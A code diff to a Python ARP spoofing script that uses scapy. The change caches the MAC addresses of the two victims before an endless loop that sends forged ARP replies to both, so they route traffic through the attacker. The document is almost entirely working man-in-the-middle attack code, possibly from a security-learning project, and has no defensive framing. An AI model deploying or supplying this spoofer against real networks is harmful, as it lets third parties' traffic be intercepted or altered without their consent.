@@ -25,9 +25,8 @@ def get_mac(ip_address):
     return answered_list[0][1].hwsrc
 
 
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+def spoof(target_ip, spoof_ip, mac):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 
@@ -41,12 +40,14 @@ def restore_arp(destination_ip, source_ip):
 
 
 options = get_arguments()
+target_mac = get_mac(options[0])
+destination_mac = get_mac(options[1])
 sent_packets_counts = 0
 
 try:
     while True:
-        spoof(options[0], options[1])
-        spoof(options[1], options[0])
+        spoof(options[0], options[1], target_mac)
+        spoof(options[1], options[0], destination_mac)
         sent_packets_counts += 2
         print(f'\r[+] Packets sent : {str(sent_packets_counts)}', end="")
 
